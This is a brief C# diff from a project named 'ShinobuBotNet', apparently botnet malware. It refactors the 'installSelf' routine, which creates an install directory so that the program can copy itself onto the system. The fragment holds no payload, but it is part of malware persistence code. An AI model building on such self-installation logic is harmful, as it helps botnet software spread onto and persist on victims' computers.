@@ -16,10 +16,10 @@ namespace ShinobuBotNet
         public static void installSelf()
         {
             Console.WriteLine("[+] Copying to system...");
-            if (!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
+            if (!Directory.Exists(config.dir))
             {
                 // Create dir
-                Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
+                Directory.CreateDirectory(config.dir);
             }
             if (!System.IO.File.Exists(config.InstallPath))
             {
